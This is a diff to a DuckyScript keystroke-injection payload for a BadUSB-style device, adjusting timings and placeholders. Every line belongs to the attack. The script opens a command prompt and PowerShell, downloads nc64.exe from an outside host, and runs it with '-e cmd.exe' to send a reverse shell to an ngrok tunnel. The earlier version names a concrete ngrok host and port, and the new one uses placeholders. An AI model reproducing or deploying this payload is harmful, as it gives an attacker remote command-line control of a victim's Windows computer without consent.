@@ -1,10 +1,10 @@
 DELAY 1000
 GUI r
-DELAY 1000 	
+DELAY 500 	
 
 STRING cmd
 ENTER
-DELAY 5300
+DELAY 1000
 
 STRING powershell
 DELAY 500 	
@@ -12,16 +12,17 @@ ENTER
 
 STRING cd C:\Users\Public\Desktop
 ENTER
-DELAY 500
+DELAY 300
 
 STRING $URL="https://up10.me/H/nc64.exe"
+REM  if u want u can update this download link with another secure link
 ENTER
 STRING $Path="C:\Users\Public\Desktop\nc64.exe"
 ENTER
-DELAY 1000
+DELAY 3000
 
 STRING Invoke-Webrequest -URI $URL -OutFile $Path
 ENTER
-DELAY 500
-STRING .\nc64.exe 0.tcp.eu.ngrok.io 14400 -e cmd.exe -d
+DELAY 1000
+STRING .\nc64.exe NGROK_LINK(without tcp://) NGROK_PORT -e cmd.exe -d
 ENTER
